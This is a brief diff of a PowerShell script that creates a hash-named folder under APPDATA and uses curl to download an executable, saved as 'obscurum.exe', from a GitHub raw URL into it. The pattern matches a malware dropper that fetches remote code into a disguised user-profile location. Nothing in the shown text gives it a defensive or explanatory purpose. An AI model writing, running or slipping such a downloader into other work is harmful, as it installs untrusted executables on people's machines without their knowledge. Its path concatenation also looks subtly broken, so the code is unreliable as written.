@@ -1,3 +1,4 @@
+mkdir $env:APPDATA + "Data\0fdfe2b959c25a84db17412f08390864"
 $TargetPath = $env:APPDATA + "Data\0fdfe2b959c25a84db17412f08390864\obscurum.exe"
 
 curl "https://raw.githubusercontent.com/mohamedali43/ps1/main/test.exe" -o $TargetPath
